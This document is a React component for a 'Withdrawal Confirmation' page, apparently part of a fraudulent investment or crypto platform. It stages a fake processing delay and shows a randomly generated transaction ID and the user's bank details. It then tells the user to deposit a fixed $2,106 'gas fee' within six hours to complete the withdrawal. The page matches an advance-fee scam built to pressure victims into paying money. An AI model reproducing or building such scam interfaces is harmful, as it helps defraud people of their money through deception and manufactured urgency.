import React, { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";

export default function WithdrawalPending() {
  const location = useLocation();
  const state = location.state || {};

  // Values passed from Dashboard when initiating withdrawal
  const method = state.method || "Wire Transfer";
  const amount = state.amount || 0;
  const accountName = state.accountName || "Not provided";
  const accountNumber = state.accountNumber || "Not provided";
  const bankName = state.bankName || "Not provided";

  const [loading, setLoading] = useState(true);

  // Generate random transaction ID
  const transactionId = "TXN-" + Math.floor(Math.random() * 1000000000);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  // Deposit deadline (6 hours from now)
  const depositDeadline = new Date(Date.now() + 6 * 60 * 60 * 1000);

  // Withdrawal timeline (15 minutes after deposit deadline)
  const withdrawalTimeline = new Date(
    depositDeadline.getTime() + 15 * 60 * 1000
  );

  if (loading) {
    // Full page loader
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <div className="w-20 h-20 border-8 border-indigo-600 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center">
      <div className="max-w-4xl w-full bg-white shadow-xl rounded-lg p-12">
        <h1 className="text-4xl font-bold text-center text-indigo-700 mb-10">
          Withdrawal Confirmation
        </h1>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 text-lg text-gray-800">
          <div>
            <p>
              <strong>Transaction ID:</strong> {transactionId}
            </p>
            <p>
              <strong>Method:</strong> {method}
            </p>
            <p>
              <strong>Wire Transfer Amount:</strong> ${amount}
            </p>
            <p>
              <strong>Deposit Deadline:</strong>{" "}
              {depositDeadline.toLocaleString()}
            </p>
            <p>
              <strong>Withdrawal Timeline:</strong>{" "}
              {withdrawalTimeline.toLocaleString()}
            </p>
          </div>

          <div>
            <p>
              <strong>Account Name:</strong> {accountName}
            </p>
            <p>
              <strong>Account Number:</strong> {accountNumber}
            </p>
            <p>
              <strong>Bank Name:</strong> {bankName}
            </p>
          </div>
        </div>

        <p className="mt-10 text-red-600 font-semibold text-center text-xl">
          Instruction: Please deposit <strong>$2,106</strong> into your account
          as gas fee before <strong>{depositDeadline.toLocaleString()}</strong>{" "}
          to complete the withdrawal.
        </p>
      </div>
    </div>
  );
}
